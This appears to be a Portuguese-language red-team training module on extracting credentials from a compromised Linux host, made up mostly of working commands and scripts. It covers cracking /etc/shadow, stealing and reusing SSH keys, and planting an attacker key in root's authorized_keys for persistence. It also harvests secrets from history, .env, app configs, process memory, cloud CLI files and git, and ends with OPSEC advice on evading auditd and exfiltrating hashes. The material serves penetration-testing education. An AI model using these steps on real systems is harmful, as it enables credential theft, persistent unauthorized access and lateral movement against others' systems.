---
title: "Linux Credentials"
---

# Extracao e Abuso de Credenciais em Linux

## A Coleta Sem Mimikatz

Credenciais são a moeda do movimento lateral. Em um ambiente Linux comprometido, elas podem estar em dezenas de lugares: arquivos de configuração, histórico de comandos, memória de processos, chaves SSH e repositórios git. Cada credencial encontrada é uma porta para outro sistema.

A extração de credenciais em Linux é mais silenciosa que em Windows porque não requer ferramentas como Mimikatz. Arquivos de texto plano e configurações mal protegidas são a norma em ambientes reais. Um red teamer que sabe onde olhar raramente precisa escalar privilégios via exploit — frequentemente encontra a senha de root em um arquivo `.env` ou no `bash_history`.

ATT&CK relacionado: T1003 (OS Credential Dumping), T1552 (Unsecured Credentials), T1555 (Credentials from Password Stores), T1082 (System Information Discovery).

---

## Onde o Linux Guarda Credenciais

Credenciais em Linux existem em várias formas:

```
Hashes de senha  ← /etc/shadow (requer root)
Chaves SSH       ← ~/.ssh/id_rsa (requer acesso ao usuário)
Texto plano      ← .env, configurações de app, histórico
Memória          ← /proc/PID/mem, /proc/PID/environ
Ferramentas CLI  ← AWS CLI, kubectl, gcloud configs
```

O modelo de permissões do Linux protege muitos desses arquivos, mas misconfigurations, aplicações rodando como root que escrevem credenciais em arquivos legíveis, e descuido de desenvolvedores são vetores constantes.

---

## Na Pratica

### Verificacao Rapida - O Que Olhar Primeiro

Ordem de prioridade por impacto e facilidade:

1. bash_history - frequentemente contem senhas
2. Arquivos .env - credenciais de aplicacoes
3. Configuracoes de apps conhecidas (WordPress, Django, MySQL)
4. SSH keys - acesso sem senha a outros hosts
5. /etc/shadow - se tiver root, crackear hashes
6. /proc/environ de processos - credenciais em variaveis
7. Repositorios git - credenciais commitadas
8. Ferramentas de cloud (AWS, GCP, kubectl)

---

## Exemplos de Codigo / Comandos

### /etc/shadow - Hashes de Senha

Verificar acesso:
```bash
ls -la /etc/shadow
cat /etc/shadow 2>/dev/null
```

Formato do shadow:
```
usuario:$6$salt$hash:18000:0:99999:7:::
```

Prefixos de algoritmo:
```
$1$   → MD5 (fraco, crackear rapidamente)
$5$   → SHA-256
$6$   → SHA-512 (mais comum em sistemas modernos)
$y$   → yescrypt (Debian 11+, mais robusto)
$2b$  → bcrypt (muito lento para crackear)
```

Copiar hash para crackear no Kali:
```bash
# Extrair linhas com hash (usuarios com senha definida)
grep -v ':\*\|:!' /etc/shadow
```

#### John the Ripper

```bash
# Preparar arquivo combinando passwd e shadow
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt

# Crackear com wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/combined.txt

# Ver senhas crackeadas
john --show /tmp/combined.txt

# Regras de mutacao (mais eficiente)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 /tmp/combined.txt

# Apenas um hash especifico
echo '$6$salt$hash_completo' > /tmp/hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
```

#### Hashcat

```bash
# Identificar o modo (-m)
# SHA-512crypt ($6$) = 1800
# SHA-256crypt ($5$) = 7400
# MD5crypt ($1$)    = 500
# bcrypt ($2b$)     = 3200

# Extrair apenas o hash (campo 2 do shadow)
cut -d: -f2 /etc/shadow | grep '^\$' > /tmp/hashes.txt

# Crackear SHA-512
hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt

# Com regras
hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Ataque de mascara (senhas no formato Empresa@2024)
hashcat -m 1800 /tmp/hashes.txt -a 3 'Empresa@?d?d?d?d'

# Verificar status durante execucao: pressionar 's'
# Ver senhas crackeadas
hashcat -m 1800 /tmp/hashes.txt --show
```

---

### SSH Keys

Localizacoes comuns:
```bash
# Chaves privadas do usuario
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ecdsa
cat ~/.ssh/id_ed25519

# Buscar chaves em todo sistema
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
```

Verificar se chave tem passphrase:
```bash
ssh-keygen -y -f /tmp/id_rsa
# Se pedir passphrase: tem protecao
# Se mostrar chave publica: sem passphrase, usar direto
```

Usar chave para conectar:
```bash
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa usuario@TARGET_IP

# Se tiver lista de hosts conhecidos
cat ~/.ssh/known_hosts
# Conectar em cada host
for host in $(cat ~/.ssh/known_hosts | cut -d' ' -f1 | sort -u); do
    ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no usuario@$host id 2>/dev/null && echo "ACESSO: $host"
done
```

Adicionar nossa chave publica como authorized_keys:
```bash
# Gerar par de chaves no Kali
ssh-keygen -t ed25519 -f /tmp/nossa_chave -N ""
cat /tmp/nossa_chave.pub

# No host comprometido
echo "ssh-ed25519 AAAA...nossa_chave_publica..." >> ~/.ssh/authorized_keys
# Ou para root se tiver acesso
echo "ssh-ed25519 AAAA...nossa_chave_publica..." >> /root/.ssh/authorized_keys
```

Crackear passphrase de chave SSH:
```bash
# Converter para formato john
ssh2john /tmp/id_rsa > /tmp/ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ssh_hash.txt

# Ou hashcat (modo 22921 para Ed25519, 22911 para RSA)
ssh2john /tmp/id_rsa | hashcat -m 22921
```

---

### bash_history

```bash
# Historico do usuario atual
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.bash_profile
cat ~/.bashrc

# Historico de todos os usuarios (requer root)
cat /root/.bash_history
for user in $(ls /home/); do
    echo "=== $user ==="
    cat /home/$user/.bash_history 2>/dev/null
done

# Buscar padroes de senha no historico
grep -i "password\|passwd\|pass\|secret\|key\|token\|apikey" ~/.bash_history
grep -E "(mysql|psql|mongo|redis).*(-p|-password|password)" ~/.bash_history

# Buscar conexoes SSH com IPs
grep -E "ssh.*@" ~/.bash_history

# Buscar comandos curl com credenciais
grep -i "curl.*-u\|curl.*--user\|wget.*--password" ~/.bash_history
```

Exemplos de achados comuns no history:
```bash
mysql -u root -pMinhaS3nha123 database
ssh admin@192.168.1.50 -i /opt/keys/prod.pem
curl -u admin:senha123 http://api.internal/users
psql -h db.internal -U postgres -W
ansible-playbook site.yml --vault-password-file=vault_pass.txt
aws configure  # seguido de Access Key no proximo comando
```

---

### Variaveis de Ambiente em Processos

```bash
# Ambiente do processo atual
cat /proc/$$/environ | tr '\0' '\n'

# Ambiente de processos especificos (requer acesso ao processo)
# Listar PIDs de processos interessantes
ps aux | grep -i "python\|ruby\|node\|java\|php"

# Ler ambiente de PID especifico
cat /proc/1234/environ 2>/dev/null | tr '\0' '\n'

# Buscar em todos processos (requer root para muitos)
for pid in $(ls /proc | grep '^[0-9]'); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key\|token\|api" && echo "PID: $pid"
done
```

Arquivo de ambiente de servico systemd:
```bash
# Servicos systemd podem ter EnvironmentFile
systemctl show SERVICO --property=EnvironmentFiles
cat /etc/systemd/system/SERVICO.service | grep -i "env\|Environment"
ls /etc/default/     # arquivos de configuracao de ambiente
```

---

### Arquivos .env

```bash
# Busca ampla
find / -name ".env" 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name "env.txt" 2>/dev/null
find / -name "environment" 2>/dev/null

# Localidades comuns
ls -la /var/www/html/.env
ls -la /opt/app/.env
ls -la /srv/app/.env
ls -la ~/app/.env

# Buscar por conteudo tipico de .env
grep -r "DB_PASSWORD\|SECRET_KEY\|API_KEY\|DATABASE_URL" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD\|SECRET_KEY\|API_KEY\|DATABASE_URL" /opt/ 2>/dev/null
grep -r "DB_PASSWORD\|SECRET_KEY\|API_KEY\|DATABASE_URL" /srv/ 2>/dev/null

# Buscar arquivos com credenciais em texto plano
grep -rl "password\s*=\|passwd\s*=\|secret\s*=" /etc/ 2>/dev/null
grep -rl "password\s*=\|passwd\s*=\|secret\s*=" /var/www/ 2>/dev/null
```

---

### Configuracoes de Aplicacoes

#### MySQL
```bash
cat /etc/mysql/debian.cnf         # usuario/senha do sistema debian-sys-maint
cat /etc/mysql/mysql.conf.d/*.cnf
cat /root/.my.cnf 2>/dev/null     # credenciais root MySQL salvas
grep -r "password" /etc/mysql/ 2>/dev/null
# Buscar em aplicacoes
grep -r "DB_PASS\|MYSQL_PASSWORD\|db_password" /var/www/ 2>/dev/null
```

Exemplo de `/etc/mysql/debian.cnf`:
```ini
[client]
host     = localhost
user     = debian-sys-maint
password = AbCdEfGhIjKl
```

Usar a senha encontrada:
```bash
mysql -u debian-sys-maint -pAbCdEfGhIjKl
# Dentro do MySQL:
SELECT user, password, host FROM mysql.user;
SHOW DATABASES;
```

#### PostgreSQL
```bash
cat /etc/postgresql/*/main/pg_hba.conf  # configuracao de autenticacao
cat /var/lib/postgresql/.pgpass 2>/dev/null  # senhas salvas
find / -name ".pgpass" 2>/dev/null
# Conectar como postgres se possivel
sudo -u postgres psql -c '\du'  # listar usuarios
sudo -u postgres psql -c 'SELECT usename, passwd FROM pg_shadow;'
```

#### WordPress
```bash
find / -name "wp-config.php" 2>/dev/null
cat /var/www/html/wp-config.php
# Procurar por:
grep "DB_PASSWORD\|DB_USER\|DB_NAME\|DB_HOST\|table_prefix\|AUTH_KEY\|SECURE_AUTH_KEY" /var/www/html/wp-config.php
```

Saida tipica:
```php
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'SuperSenha123!' );
define( 'DB_HOST', 'localhost' );
```

#### Django
```bash
find / -name "settings.py" 2>/dev/null
grep -E "PASSWORD|SECRET_KEY|DATABASE" /path/to/settings.py
# Procurar por:
grep "SECRET_KEY\|DATABASES\|PASSWORD\|AWS_" /opt/app/config/settings.py
```

#### Outros Frameworks
```bash
# Ruby on Rails
find / -name "database.yml" 2>/dev/null
find / -name "secrets.yml" 2>/dev/null
cat /var/www/app/config/database.yml

# Laravel
find / -name ".env" -path "*/laravel*" 2>/dev/null

# Spring Boot
find / -name "application.properties" 2>/dev/null
find / -name "application.yml" 2>/dev/null
grep -i "password\|secret" /opt/app/application.properties

# Node.js
find / -name "config.json" 2>/dev/null
find / -name ".env" 2>/dev/null

# Apache
grep -r "AuthUserFile\|AuthGroupFile" /etc/apache2/ 2>/dev/null
cat /etc/apache2/.htpasswd 2>/dev/null
```

---

### Memoria de Processos - /proc/PID/mem

Extrair strings de memoria de processo (tecnica avancada):
```bash
# Identificar PID do processo alvo
ps aux | grep apache2

# Ver mapa de memoria
cat /proc/1234/maps

# Extrair regioes de memoria legivel (heap, stack)
# Script para dump de memoria:
cat /proc/1234/maps | grep -E "heap|stack" | awk '{print $1}' | while IFS=- read start end; do
    dd if=/proc/1234/mem bs=1 skip=$((16#$start)) count=$((16#$end - 16#$start)) 2>/dev/null
done | strings | grep -i "pass\|secret\|token"
```

Script Python para dump de processo:
```python
#!/usr/bin/env python3
import sys
import re

pid = int(sys.argv[1])
maps_file = f"/proc/{pid}/maps"
mem_file = f"/proc/{pid}/mem"

with open(maps_file) as maps:
    for line in maps:
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) (r)..', line)
        if m and m.group(3) == 'r':
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            with open(mem_file, 'rb') as mem:
                try:
                    mem.seek(start)
                    chunk = mem.read(end - start)
                    if b'password' in chunk.lower() or b'secret' in chunk.lower():
                        print(f"Encontrado em {hex(start)}-{hex(end)}")
                        print(chunk[:500])
                except:
                    pass
```

---

### Ansible Vault

Identificar arquivos vault:
```bash
find / -name "*.vault" 2>/dev/null
find / -name "vault.yml" 2>/dev/null
find / -name "secrets.yml" 2>/dev/null
find / -name "*vault*" 2>/dev/null

# Identificar arquivos encriptados por Ansible Vault
grep -rl '\$ANSIBLE_VAULT' / 2>/dev/null

# Formato do arquivo vault:
# $ANSIBLE_VAULT;1.1;AES256
# 3238393766...
```

Crackear vault:
```bash
# Instalar ansible2john se nao tiver
pip install ansible-vault

# Converter para formato john
ansible2john vault.yml > vault_hash.txt
# Ou direto:
python3 /usr/share/john/ansible2john.py vault.yml > vault_hash.txt

# Crackear
john --wordlist=/usr/share/wordlists/rockyou.txt vault_hash.txt

# Alternativa com hashcat
hashcat -m 16900 vault_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Credential Files de Ferramentas

#### AWS CLI
```bash
cat ~/.aws/credentials
cat ~/.aws/config

# Formato:
# [default]
# aws_access_key_id = AKIAIOSFODNN7EXAMPLE
# aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Verificar validade
aws sts get-caller-identity

# Buscar em todo sistema
find / -name "credentials" -path "*/.aws/*" 2>/dev/null
find / -name "*.json" -path "*aws*" 2>/dev/null
```

#### Google Cloud
```bash
ls ~/.config/gcloud/
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/application_default_credentials.json
find / -name "application_default_credentials.json" 2>/dev/null
find / -name "service-account*.json" 2>/dev/null

# Verificar conta ativa
gcloud auth list
gcloud config list
```

#### kubectl / Kubernetes
```bash
cat ~/.kube/config

# Formato tem:
# clusters, users (com tokens/certificados), contexts
cat ~/.kube/config | grep "token:"
cat ~/.kube/config | grep "client-certificate-data:\|client-key-data:"

# Encontrar configs em outros lugares
find / -name "kubeconfig" 2>/dev/null
find / -name "*.kubeconfig" 2>/dev/null

# Token de ServiceAccount dentro de pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token
```

#### .netrc
```bash
cat ~/.netrc
# Formato:
# machine ftp.example.com
# login usuario
# password senha123

find / -name ".netrc" 2>/dev/null
```

#### Docker
```bash
cat ~/.docker/config.json
# Tem credenciais de registry em base64
cat ~/.docker/config.json | python3 -c "import sys,json,base64; d=json.load(sys.stdin); [print(k,base64.b64decode(v['auth']).decode()) for k,v in d.get('auths',{}).items()]"
```

---

### Senhas em Repositorios Git

```bash
# No diretorio de um repositorio
git log --oneline -20
git log -p | grep -i "password\|passwd\|secret\|api_key\|token" -A 2 -B 2

# Buscar em todo historico
git log -p --all | grep -i "password" -A 2

# Buscar usando git grep (apenas commits, nao working tree)
git log --all --oneline | awk '{print $1}' | xargs -I{} git grep -i "password" {} -- 2>/dev/null

# Trufflehog - ferramenta especializada
pip install trufflehog3
trufflehog3 --regex --entropy=False /path/to/repo

# Gitleaks
gitleaks detect --source /path/to/repo --report-format json --report-path /tmp/gitleaks.json

# Verificar branches remotas
git branch -r
git log --oneline origin/dev
git show origin/dev:config/settings.py | grep -i password
```

Verificar arquivos que deveriam estar no .gitignore mas foram commitados:
```bash
git log --all --full-history -- "*.env" "*.key" "*.pem" "secrets.yml" "credentials.json"
git show HASH:arquivo.env
```

---

## Deteccao e OPSEC

### Rastros Deixados

| Acao | Rastro |
|------|--------|
| `cat /etc/shadow` | Acesso ao arquivo logado por auditd |
| Leitura de `/proc/PID/mem` | Syscall ptrace ou process_vm_readv |
| `find / -name .env` | Multiples acessos ao filesystem |
| Copiar chave SSH | Acesso ao arquivo logado |
| Dump de memoria | Alta atividade de I/O |

### Praticas OPSEC

1. Ler arquivos sensíveis sem criar copias:
```bash
# Ruim - cria arquivo em disco
cp /root/.bash_history /tmp/hist.txt

# Bom - processa em memoria
grep -i pass /root/.bash_history
```

2. Usar redirecionamento em vez de ferramentas externas quando possivel:
```bash
# Ruim - requer instalar trufflehog
trufflehog /path/to/repo

# Silencioso - usa git nativo
git log -p | grep -i password
```

3. Verificar se auditd esta monitorando acesso a arquivos:
```bash
auditctl -l 2>/dev/null | grep -i "shadow\|passwd"
```

4. Para exfiltrar hashes sem chamar atencao, preferir copy em base64 via clipboard/terminal:
```bash
base64 /etc/shadow | head -20  # decodificar no Kali
```

---

## Módulos Relacionados

`01_linux_post_exploitation.md` cobre a enumeração inicial que revela onde buscar credenciais — paths de config, processos de DB, e variáveis de ambiente. `03_kiosk_breakouts.md` aborda ambientes kiosk onde credenciais de apps pré-instaladas são alvo de coleta. `../08_movimentacao_lateral/02_lateral_movement_linux_ssh.md` cobre como usar as chaves SSH aqui extraídas para movimentação lateral.
